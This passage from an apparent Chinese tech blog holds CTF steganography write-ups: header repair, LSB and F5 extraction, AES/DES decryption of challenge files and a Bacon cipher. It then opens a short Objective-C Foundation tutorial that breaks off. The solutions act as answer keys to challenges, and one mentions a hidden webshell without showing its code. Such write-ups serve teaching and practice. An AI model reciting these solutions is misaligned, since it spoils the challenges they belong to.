                <p>屏幕快照 2017-09-17 下午1.03.27.png</p>
            </figure>
<p>我们猜想可能是因为缺少了对应的头部，我们将这个图片的扩展名去掉了之后,使用sublime打开，就是一串十六进制，一看果然发现了缺少了对应的png文件头部,加上之后如下所示:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%881.06.02.png" alt="屏幕快照 2017-09-17 下午1.06.02.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午1.06.02.png</p>
            </figure>
<p>接下来加上对应的后缀名之后，这道题目就AC了！！！:<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%881.07.10.png" alt="屏幕快照 2017-09-17 下午1.07.10.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午1.07.10.png</p>
            </figure> </p>
<h2 id="0x04-快刷新"><a href="#0x04-快刷新" class="headerlink" title="0x04-快刷新"></a>0x04-快刷新</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%8811.21.40.png" alt="屏幕快照 2017-10-18 下午11.21.40.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午11.21.40.png</p>
            </figure>
<p>一开始试着使用StegSolve去寻找是不是LSB算法隐藏了什么东西，但是失败了。之后想到是不是有base64或者md5加密隐藏在图片中，但是还是没有找到，接下来可以再kali中使用binwalk来进行测试一下，没有后门，猜测可能是F5隐写：</p>
<p>从github上当下一份测试工具，开始进行测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/matthewgao/F5-steganography</div></pre></td></tr></table></figure>
<p>然后cd到该目录下执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#密码123456是根据图片的名字猜测的，不然就只能猜测是弱密码，写脚本爆破</div><div class="line">java Extract ~/Desktop/123456.jpg -p 123456</div></pre></td></tr></table></figure>
<p>解密之后就可以在output.txt中查看输出的flag了</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-17%20%E4%B8%8B%E5%8D%884.41.52.png" alt="屏幕快照 2017-09-17 下午4.41.52.png" title="" class="">
                <p>屏幕快照 2017-09-17 下午4.41.52.png</p>
            </figure>
<h2 id="0x05-最低位的亲吻"><a href="#0x05-最低位的亲吻" class="headerlink" title="0x05-最低位的亲吻"></a>0x05-最低位的亲吻</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%889.46.07.png" alt="屏幕快照 2017-10-18 下午9.46.07.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午9.46.07.png</p>
            </figure>
<p>从题干中我们就可以理解到这应该是使用的LSB算法（最低位隐藏了信息），那么我们可以使用stegsolve去看看能不能发现其中隐藏的图片信息，但是发现只能隐约的看到一个二维码的一角，如果只是简单的获取最后一位然后画图，没有理由找不到啊，后来发现，这个是bmp的八位灰度图，可能是StegSolve在解析的时候存在问题？</p>
<p>但后来经过查阅之后发现了在LSB算法来实现隐写的过程中，隐写的载体是png格式，jpg和bmp都是不行的：</p>
<ul>
<li>jpg对图像对象数进行了有损的压缩，修改的信息可能会被压缩的过程中破坏</li>
<li>png图像虽然也有压缩，但它是无损的压缩，从而保证修改的信息正确的表达而不丢失</li>
<li>bmp图片是没有进行压缩的，所以bmp图片特别大的</li>
</ul>
<p>在导出为png格式之后找到了隐藏的二维码，拿到flag值(注意不要直接修改后缀，这样文件头依然没有改变)</p>
<p>直接的修改文件后缀的后果：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%8810.07.41.png" alt="屏幕快照 2017-10-18 下午10.07.41.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午10.07.41.png</p>
            </figure></p>
<p>重新导出为png之后的头部：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%8810.08.15.png" alt="屏幕快照 2017-10-18 下午10.08.15.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午10.08.15.png</p>
            </figure></p>
<p>同时也可以使用编程的方式去解决，大神从来只使用自己的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> Image</div><div class="line">path = <span class="string">'01.bmp'</span></div><div class="line">img = Image.open(path)</div><div class="line">pix = img.load()</div><div class="line">str1 = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">550</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">737</span>):</div><div class="line">        <span class="keyword">if</span> pix[i,j]%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">            str1+=<span class="string">'0'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            str1+=<span class="string">'1'</span></div><div class="line">img1 = Image.new(<span class="string">"RGB"</span>,(<span class="number">550</span>, <span class="number">737</span>))</div><div class="line">k=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">550</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">737</span>):</div><div class="line">        <span class="keyword">if</span> str1[k]==<span class="string">'1'</span>:</div><div class="line">            img1.putpixel([i,j],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            img1.putpixel([i,j],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</div><div class="line">        k+=<span class="number">1</span></div><div class="line">img1.show()</div></pre></td></tr></table></figure>
<p>这里仅介绍了其中几例，CTF常见的隐写方式可以<a href="http://zjw.dropsec.xyz/uncategorized/2016/08/18/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html" target="_blank" rel="external">参考博客</a></p>
<h2 id="0x06-低调的男神"><a href="#0x06-低调的男神" class="headerlink" title="0x06-低调的男神"></a>0x06-低调的男神</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%8811.08.36.png" alt="屏幕快照 2017-10-18 下午11.08.36.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午11.08.36.png</p>
            </figure>
<p>这道题已经告诉了我们要使用stegsolve工具去处理这两张图片，首先查看了两张图片，并没有什么奇特的地方，后来想到stegsolve还有一个神奇的功能就是合并两种图片，合并之后移动到SUB发现一个类似二维码的图片：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-18%20%E4%B8%8B%E5%8D%8811.10.58.png" alt="屏幕快照 2017-10-18 下午11.10.58.png" title="" class="">
                <p>屏幕快照 2017-10-18 下午11.10.58.png</p>
            </figure>
<p>扫一扫发现根本就没什么反应，和正常的二维码有一些区别，可以反色试一试，（在windows上自带的画图可以解决，Mac上可以使用预览中的调整颜色）</p>
<p>打开反色之后的图片我们可以在红，蓝，绿三个plane找到三个二维码，信息分别是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">DES</div><div class="line">6XaMMbM7</div><div class="line">U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c=</div></pre></td></tr></table></figure>
<p>显然这告诉了你这是一个DES算法，密钥是第二个，加密过后的是第三个，解密之后就可以拿到flag值了。找一个可以解密DES的网站解密就可以得到答案了~Ps：如果解密不了，可以换个网站试试，毕竟Des加密时候的填充、编码方式都会影响结果（实测这个网站可以：<a href="http://encode.chahuo.com）" target="_blank" rel="external">http://encode.chahuo.com）</a></p>
<h2 id="ox07-大雄与多啦"><a href="#ox07-大雄与多啦" class="headerlink" title="ox07-大雄与多啦"></a>ox07-大雄与多啦</h2><p> <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8A%E5%8D%888.30.48.png" alt="屏幕快照 2017-10-19 上午8.30.48.png"></p>
<p>大雄和多啦A梦是很多人童年的记忆，那么面对这张图，会找到什么样的信息呢，下载之后首先使用binwalk扫一遍，发现有压缩包，提取之后有一个97FA.rar的压缩包，解压的时候发现需要密码，那么密码是什么呢，一般来说我们会在图片的结尾找到一个一句话木马：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8A%E5%8D%8810.09.19.png" alt="屏幕快照 2017-10-19 上午10.09.19.png" title="" class="">
                <p>屏幕快照 2017-10-19 上午10.09.19.png</p>
            </figure></p>
<p>提交之后发现密码不对，结合图片的名称可能是需要base64编码，然后又试了试，果然成功了，拿到了一个flag.txt的文件，其中就是我们所需要的flag值</p>
<h2 id="0x08-小苹果"><a href="#0x08-小苹果" class="headerlink" title="0x08-小苹果"></a>0x08-小苹果</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8B%E5%8D%887.26.58.png" alt="屏幕快照 2017-10-19 下午7.26.58.png" title="" class="">
                <p>屏幕快照 2017-10-19 下午7.26.58.png</p>
            </figure>
<p>这一题的通过率稍微要少一点了，点开图片是一个中国结，中间是一个二维码的样式，直接扫码之后得到了一串Unicode编码的字符串，通过工具解密之后得到了一串中文？？？：羊由大井夫大人王中工</p>
<p>后来经过查阅之后才知道原来是当铺密码，这是一种将中文和数字转换的密码，汉字有多少个笔画出头就转换成数字几</p>
<p>了解到了之后自然秒解密：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8B%E5%8D%887.33.44.png" alt="屏幕快照 2017-10-19 下午7.33.44.png" title="" class="">
                <p>屏幕快照 2017-10-19 下午7.33.44.png</p>
            </figure></p>
<p>那么我就开心的直接提交了，发现不对，修改格式依旧不对，这个时候在CTF中有一个很重要的事就是当一条路走不通的时候就要从头寻找有没有遗漏的线索，用binwalk扫了一下这张图片之后里面是含有压缩包的。 </p>
<p>打开之后是小苹果的音乐在那里洗脑循环，那么看来应该是使用MP3Stego了，刚才的数字就是密码。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-19%20%E4%B8%8B%E5%8D%8810.24.12.png" alt="屏幕快照 2017-10-19 下午10.24.12.png" title="" class="">
                <p>屏幕快照 2017-10-19 下午10.24.12.png</p>
            </figure>
<p>最后得到了一串很像base64的，使用python的库转换之后直接提交，拿到flag值。(这个题居然只有十分，给太低了点)</p>
<h2 id="0x09-我就是flag"><a href="#0x09-我就是flag" class="headerlink" title="0x09-我就是flag"></a>0x09-我就是flag</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-25%20%E4%B8%8A%E5%8D%8812.08.25.png" alt="屏幕快照 2017-10-25 上午12.08.25.png" title="" class="">
                <p>屏幕快照 2017-10-25 上午12.08.25.png</p>
            </figure>
<p>这道题的难度从通过率就可见一斑，涉及到了AES算法，其中有很多的地方都非常的坑。首先看到这是一个被损坏的bmp图像，所以应该是缺失了文件头，但是在网上搜索的文件头放到这里大部分都是不能使用的，后来参考了p神的writeup得到bmp图像的头文件到底是如何去标识的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#得到bmp的头文件</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBMPheader</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment">#bmp是LITTLE-ENDIAN（小字节序、低字节序）</span></div><div class="line">	bfType=<span class="string">'424d'</span> <span class="comment">#文件类型</span></div><div class="line">	bfSize=<span class="string">'360c 3000'</span> <span class="comment">#文件大小，本题3148800+54</span></div><div class="line">	bfReserved1=<span class="string">'0000'</span> <span class="comment">#保留，为0</span></div><div class="line">	bfReserved2=<span class="string">'0000'</span> <span class="comment">#保留，为0</span></div><div class="line">	bfOffBits=<span class="string">'3600 0000'</span> <span class="comment">#数据离文件头偏离量</span></div><div class="line">	biSize=<span class="string">'2800 0000'</span> <span class="comment">#位图信息头的大小</span></div><div class="line">	biWidth=<span class="string">'5605 0000'</span> <span class="comment">#宽度，本题1366</span></div><div class="line">	biHeight=<span class="string">'0003 0000'</span> <span class="comment">#高度，本题768</span></div><div class="line">	biPlanes=<span class="string">'0100'</span> <span class="comment">#颜色平面数，为1</span></div><div class="line">	biBitCount=<span class="string">'1800'</span> <span class="comment">#比特数/像素，本题24位</span></div><div class="line">	biCompression=<span class="string">'0000 0000'</span> <span class="comment">#压缩类型，0为不压缩</span></div><div class="line">	biSizeImage=<span class="string">'0000 0000'</span> <span class="comment">#图像的大小，本题多少无所谓</span></div><div class="line">	biXPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#水平分辨率，缺省</span></div><div class="line">	biYPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#垂直分辨率，缺省</span></div><div class="line">	biClrUsed=<span class="string">'0000 0000'</span> <span class="comment">#使用的颜色索引数，本题多少无所谓</span></div><div class="line">	biClrImportant=<span class="string">'0000 0000'</span> <span class="comment">#重要的颜色索引数，本题多少无所谓</span></div><div class="line">	bmp_header=bfType+bfSize+bfReserved1+bfReserved2+bfOffBits</div><div class="line">	bmp_header+=biSize+biWidth+biHeight+biPlanes+biBitCount+biCompression+biSizeImage</div><div class="line">	bmp_header+=biXPelsPerMeter+biYPelsPerMeter+biClrUsed+biClrImportant</div><div class="line">	bmp_header=bmp_header.replace(<span class="string">' '</span>,<span class="string">''</span>)</div><div class="line">	<span class="keyword">return</span> bmp_header</div></pre></td></tr></table></figure>
<p>加上头部信息之后发现得到了这样子的图片：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-25%20%E4%B8%8A%E5%8D%8812.17.09.png" alt="屏幕快照 2017-10-25 上午12.17.09.png" title="" class="">
                <p>屏幕快照 2017-10-25 上午12.17.09.png</p>
            </figure></p>
<p>使用stegsolve查看之后一无所获，结合题干中的我就是flag，并且文件名刚好是16位，可以推断是AES加密，然后手写一个python的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    ciphertext=open(<span class="string">'../Desktop/bestwing12345678.bmp'</span>,<span class="string">'rb'</span>).read() <span class="comment">#记得有'b'</span></div><div class="line">    key=<span class="string">'bestwing12345678'</span></div><div class="line">    obj=AES.new(key,AES.MODE_ECB)</div><div class="line">    message=obj.decrypt(ciphertext)</div><div class="line">    fsave=open(<span class="string">'out.bmp'</span>,<span class="string">'wb'</span>)</div><div class="line">    fsave.write(message)</div><div class="line">    fsave.close()</div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	foo()</div><div class="line">	<span class="keyword">print</span> (<span class="string">'ok'</span>)</div></pre></td></tr></table></figure>
<p>然后得到了一张图片，上面有着清晰的二维码，扫描之后终于得到了flag（注意，其中包含着许多的版本问题和加密和解密问题，需要读者自行解决）。</p>
<h2 id="0x0A-黑与白"><a href="#0x0A-黑与白" class="headerlink" title="0x0A-黑与白"></a>0x0A-黑与白</h2><p>这一次我们找到P神出的隐写术的题目，同样是一张图片，打开是一个二维码，扫一扫之后的得到了一个博客的地址：</p>
<blockquote>
<p><strong>HttP://pcat.cnbloGs.cOM?Hh</strong></p>
</blockquote>
<p>首先我们使用了三板斧—（stegsolve、binwalk、foremost）一无所获之后决定使用stegdetect去检测其隐写算法：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-25%20%E4%B8%8B%E5%8D%8811.02.31.png" alt="屏幕快照 2017-10-25 下午11.02.31.png" title="" class="">
                <p>屏幕快照 2017-10-25 下午11.02.31.png</p>
            </figure>
<p>一开始没有任何的反应，就奇了怪了…后来修改了敏感度之后才发现原来是jphide,那就是用对应的工具吧</p>
<p>到那时我们首先需要的是这个图片的密码，根据推测，密码的来源应该就藏在大小不一的地址上了：</p>
<p>将识别结果中的特殊字符去掉，可以得到HttPpcatcnbloGscOMHh，刚好20个字符，使用了2种字体（大写和小写），可以推断是培根加密</p>
<p>将20个字符分为4组，每组5个，按字体类型可以改写为（大写为B，小写为A）：</p>
<p>HttPp→ BAABA→t</p>
<p>catcn→AAAAA→a</p>
<p>bloGs→AAABA→c</p>
<p>cOMHh→ABBBA→p</p>
<p>得到密码之后，选择seek，输入并确认密码，然后选择输出文件保存的路径即可：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-25%20%E4%B8%8B%E5%8D%8811.08.53.png" alt="屏幕快照 2017-10-25 下午11.08.53.png" title="" class="">
                <p>屏幕快照 2017-10-25 下午11.08.53.png</p>
            </figure>
<h2 id="0x0B-word隐写"><a href="#0x0B-word隐写" class="headerlink" title="0x0B-word隐写"></a>0x0B-word隐写</h2><p>写了这么多实例之后，再写那些三板斧解决的，或者在这之上加上一点密码学的题目的writeup已经没有什么意义了，所以现在可以去拓展一下知识的广度，这个例子就来说一下word的隐写：</p>
<p>从题目中下载了一个word文件，其中什么都没有，一开始以为是格式问题（本人不太了解word），于是使用了winhex/hexfriend寻找看看有没有什么有用的信息；</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-26%20%E4%B8%8A%E5%8D%8812.22.08.png" alt="屏幕快照 2017-10-26 上午12.22.08.png" title="" class="">
                <p>屏幕快照 2017-10-26 上午12.22.08.png</p>
            </figure>
<p>然后就直接拿到了flag值，看起来轻松便捷，但其实还有一种做法就是打开这个word文档，然后在选项中选择打印隐藏文件，然后打印预览，那么flag值同样会跃然眼前。</p>
<h2 id="0x0C-Dark-star"><a href="#0x0C-Dark-star" class="headerlink" title="0x0C-Dark star"></a>0x0C-Dark star</h2><h4 id=""><a href="#" class="headerlink" title=""></a><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%883.54.46.png" alt="屏幕快照 2017-10-28 下午3.54.46.png" title="" class="">
                <p>屏幕快照 2017-10-28 下午3.54.46.png</p>
            </figure></h4><p>下载了一个虚拟的磁盘映像文件，网上说什么要使用winRAR或者其他的去解压，我一想，太麻烦了，并不想再去鼓捣这玩意，于是乎直接用<code>binwalk</code>先扫了一扫，发现其中有很多的jpg文件还有一个png（png是无损压缩的，所以我就直接提取了），果断使用<code>foremost</code>,然后从output中找到了我们所需要的flag值。</p>
<p>思考：永远不要被传统的思路所束缚住，不要被后缀名所迷惑，从十六进制窥得真假。</p>
<h2 id="0x13烦人DE皮卡丘"><a href="#0x13烦人DE皮卡丘" class="headerlink" title="0x13烦人DE皮卡丘"></a>0x13烦人DE皮卡丘</h2><p>如果说你觉得上面的题目过于简单不够刺激，那么我们就来试试一道刺激的题目吧，下载下来是一张皮卡丘的图片；</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%881.54.23.png" alt="屏幕快照 2017-10-29 下午1.54.23.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午1.54.23.png</p>
            </figure>
<p>首先要介绍一下所需要知道的知识，在杂项的可启动磁盘中我们了解到了png图片中第一个数据块叫做IHDR及其组成，那么png格式的图片中有没有其他的数据块呢，答案是肯定的，可以参考一下这个表：</p>
<table>
<thead>
<tr>
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>多数据块</strong></th>
<th><strong>可选否</strong></th>
<th><strong>位置限制</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>IHDR</td>
<td>文件头数据块</td>
<td>否</td>
<td>否</td>
<td>第一块</td>
</tr>
<tr>
<td>cHRM</td>
<td>基色和白色点数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>gAMA</td>
<td>图像γ数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>sBIT</td>
<td>样本有效位数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>PLTE</td>
<td>调色板数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>bKGD</td>
<td>背景颜色数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>hIST</td>
<td>图像直方图数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>tRNS</td>
<td>图像透明数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>oFFs</td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>pHYs</td>
<td>物理像素尺寸数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>sCAL</td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>IDAT</td>
<td>图像数据块</td>
<td>是</td>
<td>否</td>
<td>与其他IDAT连续</td>
</tr>
<tr>
<td>tIME</td>
<td>图像最后修改时间数据块</td>
<td>否</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>tEXt</td>
<td>文本信息数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>zTXt</td>
<td>压缩文本数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>fRAc</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFg</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFt</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFx</td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>IEND</td>
<td>图像结束数据</td>
<td>否</td>
<td>否</td>
<td>最后一个数据块</td>
</tr>
</tbody>
</table>
<p>今天要说的就是IDAT数据块，具体的png文件格式分析可以参考<a href="https://zhuanlan.zhihu.com/p/23890809" target="_blank" rel="external">知乎</a>，其中还讲了如何在不影响PNG文件的正常浏览下将payload以辅助数据块tEXt的格式插入到PNG文件中。</p>
<p>IDAT数据块是用于存储图像像素数据，在数据流中可包含多个连续的图像数据块，采用L277的派生算法进行压缩的，我们可以使用zlib去解压缩。虽然这道题使用了LSB算法，但是单纯简单的使用binwalk和stegsolve可是完全无法做出来的。</p>
<p>首先我们使用stdsolve打开这张图片，提取其中的最低位试试看，在BIt Plane Order选中RGB：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.05.36.png" alt="屏幕快照 2017-10-29 下午2.05.36.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.05.36.png</p>
            </figure>
<p>由此我们可以大概判断一下这个是lsb加密，从github上当下一份工具之后进行解密，命令如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#123456指的是密码，这里是根据提示中的弱密码进行猜测，当然也可以写脚本去进行爆破</span></div><div class="line">python lsb.py extract <span class="number">1.</span>png <span class="number">1.</span>txt <span class="number">123456</span></div></pre></td></tr></table></figure>
<p>最后打开1.txt就可以得到flag了，关于png文件中的LSB隐写还可以参考<a href="https://mp.weixin.qq.com/s?__biz=MzAxNTk5ODcxOQ==&amp;mid=2247484167&amp;idx=2&amp;sn=ae344c2f876b8003c5769fb0960d0bc9&amp;scene=0#wechat_redirect" target="_blank" rel="external">博客</a></p>
]]></content>
      
        <categories>
            
            <category> 隐写术 kali工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Foundation框架]]></title>
      <url>/2017/09/14/Foundation%E6%A1%86%E6%9E%B6/</url>
      <content type="html"><![CDATA[<p>才发现居然没有发上来….这个算是必备技能吧</p>
<a id="more"></a>
<h1 id="Foundation"><a href="#Foundation" class="headerlink" title="Foundation"></a>Foundation</h1><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>所谓的框架或库是指，常量，函数，类等东西的一个集合，所谓的Foundation框架就是苹果公司为了帮助开发者开发苹果上的程序所提供的类，方法，函数，常量等数据信息。</p>
<p>核心三大库：字符串(NSString,NSMutableString)，集合(NSArray,NSMutableArray,键值对：NSDictionary,NSMutableDictionary)，文件(NSFileManager)</p>
<p>推荐一个网站<a href="opensource.apple.com">苹果所有开源项目的托管网站</a></p>
<p>学习构造方法和其他方法主要分为五类：增、删、改、查、其他</p>
<h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>1.单例的特点</p>
<p>1个类的对象无论在何时何地创建，创建出来的都是同一个对象</p>
<p>2.无论如何创建对象，都会调用alloc方法来创建对象</p>
<ul>
<li>alloc方法的内部，只是调用了allocWithZone方法</li>
<li>实际上申请空间，创建对象的事allocWithZone在做</li>
</ul>
<p>3.要实现单例模式，也就是重写allocWithZone方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+ (instancetype)allocWithZone:(struct _NSZone *)zone&#123;</div><div class="line">    static id instance = nil;</div><div class="line">  //只有第一次才会创建对象，后面的每一次都是把第一次创建的对象返回</div><div class="line">    if( instance == nil )&#123;</div><div class="line">        instance = [super allocWithZone:zone];</div><div class="line">    &#125;</div><div class="line">    return instance;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>4.单例模式的规范</p>
<p>如果类是一个单例模式，要求为类提供一个类方法，来返回这个单例对象</p>
<p>类方法的名称必须以shared类名；default类名；</p>
